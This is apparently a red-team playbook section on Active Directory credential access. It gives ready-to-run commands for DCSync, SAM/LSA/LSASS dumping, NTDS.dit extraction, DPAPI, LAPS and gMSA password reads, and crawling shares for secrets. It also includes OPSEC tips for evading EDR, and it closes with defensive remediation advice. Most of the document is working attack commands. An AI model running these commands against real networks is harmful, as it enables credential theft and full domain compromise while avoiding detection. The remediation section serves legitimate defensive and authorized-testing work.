# Stage 6 — Credential Access

## DCSync (with replication rights)
Any principal with `DS-Replication-Get-Changes` + `...-All` (Domain Admins,
Enterprise Admins, or an ACL you gained) can pull hashes for any account —
including `krbtgt` — straight from a DC, no code on the DC.
```bash
secretsdump.py corp.local/user:pass@<DC> -just-dc            # all hashes
secretsdump.py corp.local/user:pass@<DC> -just-dc-user krbtgt
secretsdump.py corp.local/user:pass@<DC> -just-dc-user Administrator
nxc smb <DC> -u user -p pass --ntds                          # via drsuapi
```
`krbtgt` hash → golden ticket (domain persistence, kerberos-attacks.md).

## Local credential dumping (with local admin on a host)
```bash
# SAM + LSA secrets + cached domain creds
nxc smb <host> -u admin -p pass --sam --lsa
secretsdump.py corp.local/admin:pass@<host>
# LSASS (live logon creds/tickets) — pick quietest method
nxc smb <host> -u admin -p pass -M lsassy          # remote LSASS parse
# or comsvcs dump / nanodump on the host, then pypykatz:
pypykatz lsa minidump lsass.dmp
```
Cached domain creds (`$DCC2$`) crack slowly (`hashcat -m 2100`). LSA secrets can
reveal service-account cleartext.

## NTDS.dit (from a DC, offline)
```bash
# Volume Shadow Copy of ntds.dit + SYSTEM hive, then:
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```
`nxc --ntds` automates the VSS + extraction remotely.

## DPAPI (browser creds, saved RDP/creds, masterkeys)
```bash
nxc smb <host> -u admin -p pass --dpapi            # decrypt with domain backup key if DA
dpapi.py ...  # Impacket, using masterkey + machine/user context
```
DPAPI yields saved browser passwords, credential-manager secrets, and Wi-Fi keys.

## LAPS (local admin password solution)
If your principal can read `ms-Mcs-AdmPwd`/`msLAPS-Password`:
```bash
nxc ldap <DC> -u user -p pass -M laps
nxc smb <host> -u user -p pass --laps               # use read LAPS pw to log in
```

## gMSA (group Managed Service Accounts)
If allowed to read the blob, derive the password:
```bash
nxc ldap <DC> -u user -p pass --gmsa
gMSADumper.py -u user -p pass -d corp.local
```

## Where creds hide (sweep with any access)
Share crawl for `*.config`, `unattend.xml`, `web.config`, PowerShell history,
`*.kdbx`, `id_rsa`, scripts with hardcoded creds:
```bash
nxc smb <subnet/24> -u user -p pass -M spider_plus --spider-folder .
manspider <subnet/24> -u user -p pass -d corp.local -f password cred secret
```

## OPSEC
LSASS access triggers EDR; prefer `--sam/--lsa`, LAPS, or DCSync over raw LSASS
when possible. DCSync is logged (4662 with replication GUID). Handle real
credentials as sensitive engagement data; store encrypted, delete after report.

## Remediation to recommend
Restrict replication rights to DCs only; enable Credential Guard + LSA
protection (RunAsPPL); LAPS/Windows LAPS for local admin passwords; Protected
Users group + no cached creds on servers; tiered admin so high-priv creds never
land on workstations; rotate `krbtgt` twice if golden-ticket risk; monitor
4662 replication and abnormal LSASS access.
